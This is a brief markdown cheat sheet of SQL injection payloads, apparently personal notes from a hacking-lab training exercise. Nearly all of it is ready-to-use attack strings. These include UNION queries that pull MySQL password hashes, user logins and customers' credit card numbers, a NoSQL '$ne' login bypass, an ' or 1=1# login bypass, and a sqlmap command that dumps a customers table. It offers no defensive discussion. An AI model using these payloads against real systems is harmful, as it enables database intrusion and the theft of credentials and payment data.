# SQL Injection
## MySQL Plaintext Passworte
```
%' IN BOOLEAN MODE) UNION SELECT LAST_INSERT_ID(),user,Db,1,1 FROM mysql.db -- -
```
  
## MySQL Hashed Passworte
```
%' IN BOOLEAN MODE) UNION SELECT LAST_INSERT_ID(),user,password,1,1 FROM mysql.user -- -
```

## Writeup
* https://pastebin.com/jFMw8PKA

## Misc
* Database Login: 
`%' IN BOOLEAN MODE) UNION SELECT LAST_INSERT_ID(),user,Db,1,1 FROM mysql.db -- -`
* Table Columns: `%' IN BOOLEAN MODE) PROCEDURE ANALYSE() -- -`
* Username/Passwords: `%' IN BOOLEAN MODE) UNION SELECT user(),username,password,1,1 FROM login.users -- -`
* Credit Card for all Customers: `%' IN BOOLEAN MODE) UNION SELECT null,username,creditcard,'',null FROM customers -- -`
* Username/Password from MySQL: `%' IN BOOLEAN MODE) UNION SELECT LAST_INSERT_ID(),user,password,1,1 FROM mysql.user -- -`


## NoSQL Exploit
```
    username: {"$ne": null}
    password: {"$ne": null}
```

## Login SQL Injection
```
    username: hacker10
    password: ' or 1=1#
```

## sqlmap Beispiele
```
sqlmap -u http://glocken.hacking-lab.com/12001/inputval_case3/inputval3/controller\?words\=treichel\&send\=suchen\&action\=search -D glocken_emil -T customers –dump
```



